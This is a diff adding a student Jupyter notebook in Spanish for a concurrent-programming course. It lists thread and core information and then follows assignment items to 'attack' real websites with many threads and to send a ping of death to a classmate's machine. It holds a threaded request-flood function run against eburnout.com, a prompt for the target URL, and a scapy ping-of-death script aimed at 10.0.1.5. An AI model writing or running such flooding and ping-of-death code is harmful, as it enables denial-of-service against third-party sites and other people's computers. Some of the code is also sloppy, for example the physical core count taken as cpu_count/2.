@@ -1,0 +1,592 @@
+{
+ "cells": [
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "# AI1\n",
+    "\n",
+    "## Enunciado\n",
+    "\n",
+    "* 1.- Crear plantilla y portada para todos los ejercicios que realizaremos a lo largo del curso.\n",
+    "* 2.- Cree un programa para determinar :\n",
+    "* 3.- El numero de proceso que lo maneja y cuantos \"procesos\" (hilos) estan activos\n",
+    "* 4.- Cuantos hilos activos tienen lanzados en este momento ?\n",
+    "* 5.- Cuántos cores lógicos tiene su equipo ?\n",
+    "* 6.- Cuántos cores fisicos tiene su equipo ?\n",
+    "* 7.-Enumere e identifique los hilos lanzados ?\n",
+    "* 8.-Lance un ataque usando 20 hilos a: https://github.com/sukuzhanay\n",
+    "* 9.-Lance un ataque de 30 hilos a    : https://www.youtube.com/channel/UCEXbXdeafAjBahYK2hoQJFg\n",
+    "* 10.- Lance un ataque de 50 hilos a  : https://rpubs.com/christian_sucuzhanay\n",
+    "* 11.- Lance un ataque de 100 hilos a : https://rpubs.com/christian_sucuzhanay\n",
+    "* 12.- Lance un ataque de 200 hilos a : https://www.kaggle.com/sukuzhanay\n",
+    "* 13.- Lance un ataque de 300 hilos a : https://stackoverflow.com/story/christian-sucuzhanay-arevalo\n",
+    "* 14.- Lance un ataque de 400 hilos a : https://eburnout.com/\n",
+    "* 15.- Que paginas logro \"tumbar\"\n",
+    "* 16.- Lance 20 hilos con el ping de la muerte al equipo de su compañero ( a elegir )\n"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "* 1.- Crear plantilla y portada para todos los ejercicios que realizaremos a lo largo del curso"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "<h1 style = \"text-align:center; font-size: 36px\">Programación Concurrente y Distribuida </h1>\n",
+    "<a href=\"https://github.com/sukuzhanay\">\n",
+    "    <img src=\"CHRISTIAN_VLADIMIR_SUCUZHANAY_AREVALO.jpg\"  title = \"Christian Sucuzhanay Arevalo 21535220\" alt=\"Christian Vladimir Sucuzhanay Arevalo\" width=\"100\" height=\"100\" style=\"float:left;vertical-alig:middle\">\n",
+    "    <img src=\"UEM.jpg\" title= \"M21\"alt=\"UE\" width=\"105\" height=\"105\" style=\"float:right;vertical-alig:middle\">\n",
+    "    \n",
+    "    "
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "* 2.- Cree un programa para determinar :\n"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 44,
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "import requests\n",
+    "import os\n",
+    "import threading"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "* 3.- El numero de proceso que lo maneja y cuantos \"procesos\" (hilos) estan activos"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 45,
+   "metadata": {},
+   "outputs": [
+    {
+     "name": "stdout",
+     "output_type": "stream",
+     "text": [
+      "El proceso que esta manejando este prog. es : 71247\n"
+     ]
+    }
+   ],
+   "source": [
+    "print(\"El proceso que esta manejando este prog. es :\", os.getpid())"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 46,
+   "metadata": {},
+   "outputs": [
+    {
+     "name": "stdout",
+     "output_type": "stream",
+     "text": [
+      "Procesos activos en este momento de la ejecución( hilos )= --> 5\n"
+     ]
+    }
+   ],
+   "source": [
+    "print(\"Procesos activos en este momento de la ejecución( hilos )= -->\", threading.activeCount())"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "* 4.- Cuantos hilos activos tienen lanzados en este momento ?\n"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 47,
+   "metadata": {},
+   "outputs": [
+    {
+     "name": "stdout",
+     "output_type": "stream",
+     "text": [
+      "Hilos activos en este momento de la ejecución\n"
+     ]
+    }
+   ],
+   "source": [
+    "print(\"Hilos activos en este momento de la ejecución\")"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "* 5.- Cuántos cores lógicos tiene su equipo ?"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": []
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 48,
+   "metadata": {},
+   "outputs": [
+    {
+     "name": "stdout",
+     "output_type": "stream",
+     "text": [
+      "Éste equipo tiene 8 Cores lógicos\n"
+     ]
+    }
+   ],
+   "source": [
+    "print(\"Éste equipo tiene\", os.cpu_count(), \"Cores lógicos\")\n"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "* 6.- Cuántos cores fisicos tiene su equipo ?"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 49,
+   "metadata": {},
+   "outputs": [
+    {
+     "name": "stdout",
+     "output_type": "stream",
+     "text": [
+      "Éste equipo tiene 4.0 Cores fisicos\n"
+     ]
+    }
+   ],
+   "source": [
+    "print(\"Éste equipo tiene\", os.cpu_count()/2, \"Cores fisicos\")"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "* 7.-Enumere e identifique los hilos lanzados ?"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 50,
+   "metadata": {},
+   "outputs": [
+    {
+     "data": {
+      "text/plain": [
+       "[<_MainThread(MainThread, started 4591906304)>,\n",
+       " <Thread(Thread-2, started daemon 123145513242624)>,\n",
+       " <Heartbeat(Thread-3, started daemon 123145530032128)>,\n",
+       " <HistorySavingThread(IPythonHistorySavingThread, started 123145547894784)>,\n",
+       " <ParentPollerUnix(Thread-1, started daemon 123145565220864)>]"
+      ]
+     },
+     "execution_count": 50,
+     "metadata": {},
+     "output_type": "execute_result"
+    }
+   ],
+   "source": [
+    "threading.enumerate()"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "Tenemos un hilo principal, T2 que es demonio, el hilo tres es el que está determinando si el sistema sigue funcionando y que también es demonio, el cuarto nos hace el seguimiento del historial cuando grabamos, es usado por JupiterLab y tambien es demonio y Finalmente tenemos un hilo padre que también es demonio."
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "* 8.-Lance un ataque usando 20 hilos a: https://github.com/sukuzhanay"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "Para lanzar el ataque requiero de la librería Requests que le importo en el punto 2."
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "Crea una función para realizar los ataques"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 12,
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "def ataque():\n",
+    "    print(requests.get('https://eburnout.com/'))\n",
+    "    print(\"Lanzado el hilo con identificador\", threading.current_thread().getName())\n"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "Creo una función para preguntar el número de hilos a utilizar y la dirección a donde quiere atacar"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 34,
+   "metadata": {},
+   "outputs": [
+    {
+     "name": "stdin",
+     "output_type": "stream",
+     "text": [
+      "Dígame el número de hilos 10\n"
+     ]
+    }
+   ],
+   "source": [
+    "num_hilos=int(input(\"Dígame el número de hilos\"))"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 25,
+   "metadata": {},
+   "outputs": [
+    {
+     "name": "stdin",
+     "output_type": "stream",
+     "text": [
+      "Dígame a dirección web correctamente formateada https://eburnout.com/\n"
+     ]
+    }
+   ],
+   "source": [
+    "web=input(\"Dígame a dirección web correctamente formateada\")"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 35,
+   "metadata": {},
+   "outputs": [
+    {
+     "name": "stdout",
+     "output_type": "stream",
+     "text": [
+      "\n",
+      "Ataque usando, 10\n"
+     ]
+    }
+   ],
+   "source": [
+    "print('\\nAtaque usando,', num_hilos)"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 38,
+   "metadata": {},
+   "outputs": [
+    {
+     "name": "stdout",
+     "output_type": "stream",
+     "text": [
+      "<Response [200]>\n",
+      "Lanzado el hilo con identificador Thread-66\n",
+      "<Response [200]>\n",
+      "Lanzado el hilo con identificador Thread-64\n",
+      "<Response [200]>\n",
+      "Lanzado el hilo con identificador Thread-67\n",
+      "<Response [200]>\n",
+      "<Response [200]><Response [200]>\n",
+      "\n",
+      "Lanzado el hilo con identificador Thread-65\n",
+      "Lanzado el hilo con identificador Thread-73\n",
+      "Lanzado el hilo con identificador Thread-71\n",
+      "<Response [200]><Response [200]><Response [200]>\n",
+      "\n",
+      "<Response [200]>Lanzado el hilo con identificadorLanzado el hilo con identificador\n",
+      "Lanzado el hilo con identificador Thread-69\n",
+      " Thread-68\n",
+      "\n",
+      "Lanzado el hilo con identificador Thread-72\n",
+      " Thread-70\n"
+     ]
+    }
+   ],
+   "source": [
+    "for i in range(num_hilos):\n",
+    "    threading.Thread(target=ataque).start()"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 43,
+   "metadata": {},
+   "outputs": [
+    {
+     "name": "stderr",
+     "output_type": "stream",
+     "text": [
+      "UsageError: Line magic function `%git` not found.\n"
+     ]
+    }
+   ],
+   "source": [
+    "% ping "
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 110,
+   "metadata": {},
+   "outputs": [
+    {
+     "data": {
+      "text/plain": [
+       "<module 'requests' from '/opt/anaconda3/lib/python3.7/site-packages/requests/__init__.py'>"
+      ]
+     },
+     "execution_count": 110,
+     "metadata": {},
+     "output_type": "execute_result"
+    }
+   ],
+   "source": [
+    "requests"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 86,
+   "metadata": {},
+   "outputs": [
+    {
+     "data": {
+      "text/plain": [
+       "<function __main__.attack()>"
+      ]
+     },
+     "execution_count": 86,
+     "metadata": {},
+     "output_type": "execute_result"
+    }
+   ],
+   "source": [
+    "attack."
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": null,
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "ataque = requests.get('https://github.com/sukuzhanay')"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": null,
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "attack"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": null,
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "ataque"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 166,
+   "metadata": {},
+   "outputs": [
+    {
+     "name": "stderr",
+     "output_type": "stream",
+     "text": [
+      "UsageError: Line magic function `%ping` not found.\n"
+     ]
+    }
+   ],
+   "source": [
+    "%ping 127.0.0.0 -l 65500 -w 1 -n 1"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 175,
+   "metadata": {},
+   "outputs": [
+    {
+     "name": "stderr",
+     "output_type": "stream",
+     "text": [
+      "UsageError: Line magic function `%ping` not found.\n"
+     ]
+    }
+   ],
+   "source": [
+    "%"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 185,
+   "metadata": {},
+   "outputs": [
+    {
+     "name": "stderr",
+     "output_type": "stream",
+     "text": [
+      "UsageError: Line magic function `%` not found.\n"
+     ]
+    }
+   ],
+   "source": [
+    "% pip"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 1,
+   "metadata": {},
+   "outputs": [
+    {
+     "ename": "ModuleNotFoundError",
+     "evalue": "No module named 'scapy'",
+     "output_type": "error",
+     "traceback": [
+      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
+      "\u001b[0;31mModuleNotFoundError\u001b[0m                       Traceback (most recent call last)",
+      "\u001b[0;32m<ipython-input-1-3bc447070e4b>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0;32mimport\u001b[0m \u001b[0mscapy\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      2\u001b[0m \u001b[0mSOURCE_IP\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;34m\"10.0.1.1\"\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      3\u001b[0m \u001b[0mTARGET_IP\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;34m\"10.0.1.5\"\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      4\u001b[0m \u001b[0mMESSAGE\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;34m\"T\"\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      5\u001b[0m \u001b[0mNUMBER_PACKETS\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;36m5\u001b[0m \u001b[0;31m# Number of pings\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
+      "\u001b[0;31mModuleNotFoundError\u001b[0m: No module named 'scapy'"
+     ]
+    }
+   ],
+   "source": [
+    "import scapy\n",
+    "SOURCE_IP=\"10.0.1.1\"\n",
+    "TARGET_IP=\"10.0.1.5\"\n",
+    "MESSAGE=\"T\"\n",
+    "NUMBER_PACKETS=5 # Number of pings\n",
+    "\n",
+    "pingOFDeath = IP(src=SOURCE_IP, dst=TARGET_IP)/ICMP()/(MESSAGE*60000)\n",
+    "send(NUMBER_PACKETS*pingOFDeath)"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 187,
+   "metadata": {},
+   "outputs": [
+    {
+     "name": "stdout",
+     "output_type": "stream",
+     "text": [
+      "Collecting scapy[basic]\n",
+      "\u001b[?25l  Downloading https://files.pythonhosted.org/packages/c6/8f/438d4d0bab4c8e22906a7401dd082b4c0f914daf2bbdc7e7e8390d81a5c3/scapy-2.4.4.tar.gz (1.0MB)\n",
+      "\u001b[K     |████████████████████████████████| 1.0MB 2.2MB/s eta 0:00:01\n",
+      "\u001b[?25hRequirement already satisfied: ipython in /opt/anaconda3/lib/python3.7/site-packages (from scapy[basic]) (7.8.0)\n",
+      "Requirement already satisfied: jedi>=0.10 in /opt/anaconda3/lib/python3.7/site-packages (from ipython->scapy[basic]) (0.15.1)\n",
+      "Requirement already satisfied: backcall in /opt/anaconda3/lib/python3.7/site-packages (from ipython->scapy[basic]) (0.1.0)\n",
+      "Requirement already satisfied: appnope; sys_platform == \"darwin\" in /opt/anaconda3/lib/python3.7/site-packages (from ipython->scapy[basic]) (0.1.0)\n",
+      "Requirement already satisfied: decorator in /opt/anaconda3/lib/python3.7/site-packages (from ipython->scapy[basic]) (4.4.0)\n",
+      "Requirement already satisfied: pygments in /opt/anaconda3/lib/python3.7/site-packages (from ipython->scapy[basic]) (2.4.2)\n",
+      "Requirement already satisfied: setuptools>=18.5 in /opt/anaconda3/lib/python3.7/site-packages (from ipython->scapy[basic]) (41.4.0)\n",
+      "Requirement already satisfied: traitlets>=4.2 in /opt/anaconda3/lib/python3.7/site-packages (from ipython->scapy[basic]) (4.3.3)\n",
+      "Requirement already satisfied: prompt-toolkit<2.1.0,>=2.0.0 in /opt/anaconda3/lib/python3.7/site-packages (from ipython->scapy[basic]) (2.0.10)\n",
+      "Requirement already satisfied: pickleshare in /opt/anaconda3/lib/python3.7/site-packages (from ipython->scapy[basic]) (0.7.5)\n",
+      "Requirement already satisfied: pexpect; sys_platform != \"win32\" in /opt/anaconda3/lib/python3.7/site-packages (from ipython->scapy[basic]) (4.7.0)\n",
+      "Requirement already satisfied: parso>=0.5.0 in /opt/anaconda3/lib/python3.7/site-packages (from jedi>=0.10->ipython->scapy[basic]) (0.5.1)\n",
+      "Requirement already satisfied: ipython-genutils in /opt/anaconda3/lib/python3.7/site-packages (from traitlets>=4.2->ipython->scapy[basic]) (0.2.0)\n",
+      "Requirement already satisfied: six in /opt/anaconda3/lib/python3.7/site-packages (from traitlets>=4.2->ipython->scapy[basic]) (1.12.0)\n",
+      "Requirement already satisfied: wcwidth in /opt/anaconda3/lib/python3.7/site-packages (from prompt-toolkit<2.1.0,>=2.0.0->ipython->scapy[basic]) (0.1.7)\n",
+      "Requirement already satisfied: ptyprocess>=0.5 in /opt/anaconda3/lib/python3.7/site-packages (from pexpect; sys_platform != \"win32\"->ipython->scapy[basic]) (0.6.0)\n",
+      "Building wheels for collected packages: scapy\n",
+      "  Building wheel for scapy (setup.py) ... \u001b[?25ldone\n",
+      "\u001b[?25h  Created wheel for scapy: filename=scapy-2.4.4-py2.py3-none-any.whl size=1189181 sha256=624911bd16ec4aded56a9edab01687274de396e1b297537575e143581a06034a\n",
+      "  Stored in directory: /Users/christiansucuzhanayarevalo/Library/Caches/pip/wheels/2c/e7/01/f097df99ac9cd0d4f744c255f918d471d7a4b0766bc84c38c3\n",
+      "Successfully built scapy\n",
+      "Installing collected packages: scapy\n",
+      "Successfully installed scapy-2.4.4\n",
+      "Note: you may need to restart the kernel to use updated packages.\n"
+     ]
+    }
+   ],
+   "source": [
+    "pip install --pre scapy[basic]"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": null,
+   "metadata": {},
+   "outputs": [],
+   "source": []
+  },
+  {
+   "cell_type": "code",
+   "execution_count": null,
+   "metadata": {},
+   "outputs": [],
+   "source": []
+  }
+ ],
+ "metadata": {
+  "kernelspec": {
+   "display_name": "Python 3",
+   "language": "python",
+   "name": "python3"
+  },
+  "language_info": {
+   "codemirror_mode": {
+    "name": "ipython",
+    "version": 3
+   },
+   "file_extension": ".py",
+   "mimetype": "text/x-python",
+   "name": "python",
+   "nbconvert_exporter": "python",
+   "pygments_lexer": "ipython3",
+   "version": "3.8.5"
+  }
+ },
+ "nbformat": 4,
+ "nbformat_minor": 4
+}
